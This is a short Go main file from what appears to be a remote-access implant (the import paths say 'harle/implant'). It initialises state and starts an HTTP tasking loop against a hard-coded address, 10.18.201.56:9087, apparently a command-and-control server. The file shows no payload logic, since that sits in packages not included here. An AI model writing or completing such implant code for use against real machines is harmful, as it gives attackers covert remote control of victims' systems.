package main

import (
	"github.com/lzkking/harle/implant/internal/global"
	"github.com/lzkking/harle/implant/internal/transport"
)

func main() {
	err := global.Init()
	if err != nil {
		panic(err)
	}

	transport.StartHttpTask("http://10.18.201.56:9087")
}
